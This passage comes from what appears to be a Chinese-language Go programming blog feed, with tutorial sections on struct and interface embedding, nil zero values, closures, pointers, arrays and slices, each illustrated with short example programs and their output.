class="hljs-keyword">type</span> Photographic <span class="hljs-keyword">struct</span>&#123;&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p Photographic)</span></span> Photograph() &#123;  <br>fmt.Println(<span class="hljs-string">&quot;can take photos&quot;</span>)  <br>&#125;  <br>  <br><span class="hljs-keyword">type</span> Moblie <span class="hljs-keyword">struct</span> &#123;  <br>Callabale  <br>Photographic  <br>&#125;  <br>  <br><span class="hljs-keyword">type</span> Pad <span class="hljs-keyword">struct</span> &#123;  <br>Photographic  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br><span class="hljs-keyword">var</span> m Moblie  <br>fmt.Println(<span class="hljs-string">&quot;Moble Function:&quot;</span>)  <br>m.Call()  <br>m.Photograph()  <br>  <br><span class="hljs-keyword">var</span> p Pad  <br>fmt.Println(<span class="hljs-string">&quot;Pad Function:&quot;</span>)  <br>p.Photograph()  <br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">Moble <span class="hljs-keyword">Function</span>:<br>can <span class="hljs-keyword">call</span><br>can <span class="hljs-keyword">take</span> photos<br>Pad <span class="hljs-keyword">Function</span>:<br>can <span class="hljs-keyword">take</span> photos<br></code></pre></td></tr></table></figure><h2 id="3-接口内嵌接口"><a href="#3-接口内嵌接口" class="headerlink" title="3. 接口内嵌接口"></a>3. 接口内嵌接口</h2><p>接口内嵌接口也是一个非常实用的特性，可以使用这个功能来使同一个结构体，放在不同的接口中，而能使用的功能不同。常用的权限控制，对一个相同的数据结构，但是能操作的权限可以用接口分开。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-keyword">type</span> Reader <span class="hljs-keyword">interface</span> &#123;  <br>Read()  <br>&#125;  <br>  <br><span class="hljs-keyword">type</span> Writer <span class="hljs-keyword">interface</span> &#123;  <br>Write()  <br>&#125;  <br>  <br><span class="hljs-keyword">type</span> OnlyReader <span class="hljs-keyword">interface</span> &#123;  <br>Reader  <br>&#125;  <br>  <br><span class="hljs-keyword">type</span> ReaderAndWriter <span class="hljs-keyword">interface</span> &#123;  <br>Reader  <br>Writer  <br>&#125;  <br>  <br><span class="hljs-keyword">type</span> file <span class="hljs-keyword">struct</span>&#123;&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(f file)</span></span> Read() &#123;  <br>fmt.Println(<span class="hljs-string">&quot;Read something&quot;</span>)  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(f file)</span></span> Write() &#123;  <br>fmt.Println(<span class="hljs-string">&quot;Write something&quot;</span>)  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>f := file&#123;&#125;  <br><span class="hljs-keyword">var</span> rAndW ReaderAndWriter  <br>rAndW = f  <br>rAndW.Read()  <br>rAndW.Write()  <br>  <br><span class="hljs-keyword">var</span> onlyR OnlyReader  <br>onlyR = f  <br>onlyR.Read()  <br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-keyword">Read</span> something<br><span class="hljs-keyword">Write</span> something<br><span class="hljs-keyword">Read</span> something<br></code></pre></td></tr></table></figure><h1 id="Go-语言中的nil"><a href="#Go-语言中的nil" class="headerlink" title="Go 语言中的nil"></a>Go 语言中的nil</h1><p><strong>nil</strong> 是 Go 语言中内置的一个标识符，有人会把它当作其它语言中的NULL，这个是<strong>不准确的</strong>。</p><h2 id="1-nil-是特殊的零值"><a href="#1-nil-是特殊的零值" class="headerlink" title="1. nil 是特殊的零值"></a>1. nil 是特殊的零值</h2><p>在 Go 语言中，任何一个变量在声明之后会自动被<strong>赋予一个零值</strong>。数值类型的变量零值为0，字符串为””,而<strong>指针、切片、map、通道、函数和接口</strong>的零值就是nil。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br><span class="hljs-keyword">var</span> m <span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">string</span>  <br><span class="hljs-keyword">var</span> p *<span class="hljs-type">int</span>  <br><span class="hljs-keyword">var</span> c <span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>  <br><span class="hljs-keyword">var</span> s []<span class="hljs-type">int</span>  <br><span class="hljs-keyword">var</span> f <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span>  <br><span class="hljs-keyword">var</span> i <span class="hljs-keyword">interface</span>&#123;&#125;  <br>fmt.Printf(<span class="hljs-string">&quot;map:%#v\n&quot;</span>, m)  <br>fmt.Printf(<span class="hljs-string">&quot;指针:%#v\n&quot;</span>, p)  <br>fmt.Printf(<span class="hljs-string">&quot;通道:%#v\n&quot;</span>, c)  <br>fmt.Printf(<span class="hljs-string">&quot;切片:%#v\n&quot;</span>, s)  <br>fmt.Printf(<span class="hljs-string">&quot;函数:%#v\n&quot;</span>, f)  <br>fmt.Printf(<span class="hljs-string">&quot;接口:%#v\n&quot;</span>, i)  <br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">map</span>:<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">string</span>(<span class="hljs-literal">nil</span>)<br>指针:(*<span class="hljs-type">int</span>)(<span class="hljs-literal">nil</span>)<br>通道:(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)(<span class="hljs-literal">nil</span>)<br>切片:[]<span class="hljs-type">int</span>(<span class="hljs-literal">nil</span>)<br>函数:(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span>)(<span class="hljs-literal">nil</span>)<br>接口:&lt;<span class="hljs-literal">nil</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="2-nil-标识符无法比较"><a href="#2-nil-标识符无法比较" class="headerlink" title="2. nil 标识符无法比较"></a>2. nil 标识符无法比较</h2><p>在 Go 语言中 <strong>nil 和 nil 之间是无法比较的</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    fmt.Println(<span class="hljs-literal">nil</span> == <span class="hljs-literal">nil</span>)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">./hello.go:8:21: invalid operation: nil == nil (operator == not defined on untyped nil)<br></code></pre></td></tr></table></figure><h2 id="3-不同类型的的-nil-的长度不同"><a href="#3-不同类型的的-nil-的长度不同" class="headerlink" title="3. 不同类型的的 nil 的长度不同"></a>3. 不同类型的的 nil 的长度不同</h2><p>不同类型的变量的<strong>内存分配都是不同的</strong>，即使是 <strong>nil</strong> ，分配的内存也是不同的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;unsafe&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">var</span> m <span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">string</span><br>    <span class="hljs-keyword">var</span> p *<span class="hljs-type">int</span><br>    <span class="hljs-keyword">var</span> c <span class="hljs-keyword">chan</span> <span class="hljs-type">int</span><br>    <span class="hljs-keyword">var</span> s []<span class="hljs-type">int</span><br>    <span class="hljs-keyword">var</span> f <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span><br>    <span class="hljs-keyword">var</span> i <span class="hljs-keyword">interface</span>&#123;&#125;<br>    fmt.Println(<span class="hljs-string">&quot;map:&quot;</span>, unsafe.Sizeof( m ))<br>    fmt.Println(<span class="hljs-string">&quot;指针:&quot;</span>, unsafe.Sizeof(p))<br>    fmt.Println(<span class="hljs-string">&quot;通道:&quot;</span>, unsafe.Sizeof(c))<br>    fmt.Println(<span class="hljs-string">&quot;切片:&quot;</span>, unsafe.Sizeof(s))<br>    fmt.Println(<span class="hljs-string">&quot;函数:&quot;</span>, unsafe.Sizeof(f))<br>    fmt.Println(<span class="hljs-string">&quot;接口:&quot;</span>, unsafe.Sizeof(i))<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">map: 8</span><br><span class="hljs-section">指针: 8</span><br><span class="hljs-section">通道: 8</span><br><span class="hljs-section">切片: 24</span><br><span class="hljs-section">函数: 8</span><br><span class="hljs-section">接口: 16</span><br></code></pre></td></tr></table></figure><h1 id="Go-语言的函数式编程"><a href="#Go-语言的函数式编程" class="headerlink" title="Go 语言的函数式编程"></a>Go 语言的函数式编程</h1><p>函数式编程的基础特点为：</p><ul><li>函数是一等公民，即<strong>函数可以做为变量</strong>。</li><li>纯函数，即函数内的操作不可影响到函数外。</li></ul><p>Go 语言的函数式编程<strong>无需遵循第二点</strong>，这一特性为 Go 语言的函数式编程带来了更大的灵活性。</p><h2 id="1-编程示例"><a href="#1-编程示例" class="headerlink" title="1. 编程示例"></a>1. 编程示例</h2><p><strong>普通方式实现 1+2+3+…+100的值</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>a := <span class="hljs-number">0</span>  <br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">100</span>; i++ &#123;  <br>a = a + i  <br>&#125;  <br>fmt.Println(a)  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>函数式编程实现</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-keyword">type</span> iAdder <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">adder</span><span class="hljs-params">()</span></span> iAdder &#123;  <br>sum := <span class="hljs-number">0</span>  <br><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(v <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;  <br>sum += v  <br><span class="hljs-keyword">return</span> sum  <br>&#125;  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>a := adder()  <br><span class="hljs-keyword">var</span> s <span class="hljs-type">int</span>  <br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">100</span>; i++ &#123;  <br>s = a(i)  <br>&#125;  <br>fmt.Println(s)  <br>&#125;<br></code></pre></td></tr></table></figure><p>两者比较，后者将整个<strong>累加过程作为变量</strong>放置在了循环以外，使得整个累加可以脱离循环之外。看起来就像是不断的对一个传入的常数进行加工，就像是<strong>流水线的一个工具</strong>。所以函数式编程在开发过程中经常会用在对<strong>数据的长流程处理</strong>。例如，录入身份证号时，要从身份证号中获取年龄，籍贯、性别等信息，就可以使用三个函数对身份证号进行顺序处理。这样写的好处就在于可以随时<strong>增删其流程</strong>。</p>]]></content>
    
    
    <categories>
      
      <category>code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go语言基础学习(三)</title>
    <link href="/2023/04/28/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%B8%89)/"/>
    <url>/2023/04/28/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%B8%89)/</url>
    
    <content type="html"><![CDATA[<h1 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h1><p>Go 语言中和 C&#x2F;C++ 一样，直接提供了<strong>指针类型</strong>，但是不同的是 Go 语言的指针<strong>无法进行位移和运算</strong>的，它只是一个存储了<strong>其它变量地址的变量</strong>而已。它在 Go 语言中最大的作用就是在<strong>值传递</strong>的过程中减少内存消耗，毕竟一个地址的存储开销是十分少的。</p><h2 id="1-指针的定义和使用"><a href="#1-指针的定义和使用" class="headerlink" title="1. 指针的定义和使用"></a>1. 指针的定义和使用</h2><p>在 Go 语言中指针类型的声明和 C&#x2F;C++ 类似，都是采用 <code>*</code> 符号来区分正常类型变量和指针变量。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>str := <span class="hljs-string">&quot;Hello Golang!&quot;</span><br><span class="hljs-keyword">var</span> strP *<span class="hljs-type">string</span> <span class="hljs-comment">// 使用 *+变量类型的形式声明一个 string 类型的指针</span><br>strP = &amp;str      <span class="hljs-comment">// 将指针 strP 指向变量 str，也就是将变量 str 的地址赋值给指针变量 strP 。&amp; 为取地址符，可以取出变量所在的地址。</span><br>fmt.Println(<span class="hljs-string">&quot;未修改前变量str的值为&quot;</span>, str)<br>fmt.Println(<span class="hljs-string">&quot;未修改前变量str的地址为&quot;</span>, &amp;str)<br>*strP = <span class="hljs-string">&quot;Hello Go!&quot;</span> <span class="hljs-comment">// 通过指针修改 str 的值</span><br>fmt.Println(<span class="hljs-string">&quot;======通过指针修改后======&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;指针strP的地址为&quot;</span>, strP)<br>fmt.Println(<span class="hljs-string">&quot;指针strP的指向地址为&quot;</span>, *strP)<br>fmt.Println(<span class="hljs-string">&quot;变量str的地址为&quot;</span>, &amp;str)<br>fmt.Println(<span class="hljs-string">&quot;变量str的值为&quot;</span>, str)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tex">未修改前变量str的值为 Hello Golang!<br>未修改前变量str的地址为 0x14000096230<br>======通过指针修改后======<br>指针strP的地址为 0x14000096230<br>指针strP的指向地址为 Hello Go!<br>变量str的地址为 0x14000096230<br>变量str的值为 Hello Go!<br></code></pre></td></tr></table></figure><p>变量 strP 存储的值就是变量 str 的<strong>地址</strong>，可以通过使用 *strP 操作符改变其<strong>存储的地址所存储的值</strong>。但<strong>地址</strong>是没有改变的，都是<code>0x14000096230</code></p><h2 id="2-指针作为函数的参数"><a href="#2-指针作为函数的参数" class="headerlink" title="2. 指针作为函数的参数"></a>2. 指针作为函数的参数</h2><p>Go 语言中<strong>只有值传递，没有引用传递</strong>，因为引用传递设计之初是为了解决函数想要有多个返回值的问题，但是 Go 语言的函数自带多返回值的返回方式。所以想要指针作为参数传入函数中，只能传递地址进入函数进行修改，并不能直接引用指针参数，这一特点就大大降低了 Go 语言指针的使用难度。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := <span class="hljs-number">10</span><br>b := <span class="hljs-number">20</span><br>fmt.Println(<span class="hljs-string">&quot;交换前的a=&quot;</span>, a, <span class="hljs-string">&quot;b=&quot;</span>, b)<br><span class="hljs-comment">// 将变量 a 和 b 的地址作为函数 swap 指针参数的值传入函数；</span><br>swap(&amp;a, &amp;b)<br>fmt.Println(<span class="hljs-string">&quot;交换后的a=&quot;</span>, a, <span class="hljs-string">&quot;b=&quot;</span>, b)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">swap</span><span class="hljs-params">(a, b *<span class="hljs-type">int</span>)</span></span> &#123;<br><span class="hljs-comment">// 交换这两个指针保存的地址所保存的值。</span><br>*a, *b = *b, *a<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex">交换前的a= 10 b= 20<br>交换后的a= 20 b= 10<br></code></pre></td></tr></table></figure><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h2><ul><li>Go 语言的指针<strong>不可以做偏移</strong>；</li><li>Go 语言的指针可以看作一个<strong>存储地址的特殊变量类型</strong>。</li></ul><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="1-数组的形式"><a href="#1-数组的形式" class="headerlink" title="1. 数组的形式"></a>1. 数组的形式</h2><p>数组的声明形式形如<code>var 数组名 [数组长度]数组类型</code>，其中数组类型可以是数组本身，也就是数组类型的数组，这样就构成了多维数组。和变量的声明相同，数组在声明时会初始化变量类型的<strong>零值</strong>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a [<span class="hljs-number">2</span>]<span class="hljs-type">int</span>         <span class="hljs-comment">// 声明一个长度为2的一维数组，自动初始化为零值</span><br><span class="hljs-keyword">var</span> b [<span class="hljs-number">2</span>][<span class="hljs-number">2</span>]<span class="hljs-type">int</span>      <span class="hljs-comment">// 声明一个2行2列的二维数组。自动初始化为零值</span><br><span class="hljs-keyword">var</span> c = [<span class="hljs-number">2</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125; <span class="hljs-comment">// 声明并定义一个长度为2，值为[1,2]的数组</span><br><span class="hljs-keyword">var</span> d = [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125; <span class="hljs-comment">// 使用 ... 表示根据数组后值的长度自动初始化长度。因为后面的值是 [3,4] 数组自动初始化长度为 2</span><br>fmt.Println(<span class="hljs-string">&quot;a的零值&quot;</span>, a)<br>fmt.Println(<span class="hljs-string">&quot;b的零值&quot;</span>, b)<br>fmt.Println(<span class="hljs-string">&quot;c的值&quot;</span>, c)<br>fmt.Println(<span class="hljs-string">&quot;d的值&quot;</span>, d)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tex">a的零值 [0 0]<br>b的零值 [[0 0] [0 0]]<br>c的值 [1 2]<br>d的值 [3 4]<br></code></pre></td></tr></table></figure><h2 id="2-数组的比较"><a href="#2-数组的比较" class="headerlink" title="2. 数组的比较"></a>2. 数组的比较</h2><p>在 Go 语言中判断数组是否相等需要比较两个部分。一个是数组的长度是否相等，另一个是数组中存放的值是否顺序和大小完全相同。只要这两个部分相等，则 Go 语言中的两个数组就是相等的。</p><p>⚠️：Go 语言中只有类型相同的数组才可以互相比较，且数组没有大小的比较，只能比较是否相等。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">var</span> a [<span class="hljs-number">2</span>]<span class="hljs-type">int</span><br>    <span class="hljs-keyword">var</span> c = [<span class="hljs-number">2</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;<br>    <span class="hljs-keyword">var</span> d = [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;<br>    fmt.Println(<span class="hljs-string">&quot;a == c ? &quot;</span>, a == c)<br>    fmt.Println(<span class="hljs-string">&quot;c == d ?&quot;</span>, c == d)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex">a == c ?  false<br>c == d ? true<br></code></pre></td></tr></table></figure><h1 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h1><h2 id="1-切片的创建"><a href="#1-切片的创建" class="headerlink" title="1. 切片的创建"></a>1. 切片的创建</h2><p>切片的声明方式和数组类似，写法上看就是声明一个没有长度的数组：<code>var 切片名 []切片类型</code>。其中切片类型可以是切片本身，也就是切片的切片，就构成了<strong>多维</strong>的切片。</p><p>切片在使用之前必须要<strong>初始化</strong>，它没有零值。声明后它的值是 <strong>nil</strong>，这是因为它的底层实现是一个指向数组的指针，在你给它存入一个数组的地址之前，它只能是 <strong>nil</strong>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a []<span class="hljs-type">int</span> <span class="hljs-comment">// 声明一个int类型的切片</span><br>fmt.Println(<span class="hljs-string">&quot;初始化前: &quot;</span>, a)<br>a = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>) <span class="hljs-comment">// 声明一个长度为5，切片容量为10的切片。其中容量可以不传，默认会和长度相等。长度为切片真正有值的位置，会初始化零值</span><br>fmt.Println(<span class="hljs-string">&quot;初始化后：&quot;</span>, a)<br>a[<span class="hljs-number">4</span>] = <span class="hljs-number">5</span> <span class="hljs-comment">// 给切片的第 5 个位置赋值</span><br>fmt.Println(<span class="hljs-string">&quot;赋值后: &quot;</span>, a)<br>a[<span class="hljs-number">5</span>] = <span class="hljs-number">6</span> <span class="hljs-comment">// 给切片的第 6 个位置赋值，但是切片的长度为5，所以会报越界的错误</span><br>fmt.Println(<span class="hljs-string">&quot;赋值后： &quot;</span>, a)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tex">初始化前:  []<br>初始化后： [0 0 0 0 0]<br>赋值后:  [0 